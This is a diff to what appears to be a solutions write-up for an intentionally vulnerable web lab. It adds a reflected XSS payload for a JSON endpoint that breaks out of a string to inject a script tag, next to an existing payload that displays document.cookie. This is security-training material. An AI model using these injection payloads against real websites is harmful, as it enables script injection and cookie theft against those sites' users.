@@ -161,6 +161,13 @@ xss_post.php
 <script>alert(document.cookie)</script>
 ```
 
+### XSS - Reflected (JSON)
+
+xss_json.php
+```
+"}]}';prompt(0)</script>
+```
+
 # A4 - Insecure Direct Object References
 
 ### Insecure DOR (Change Secret)
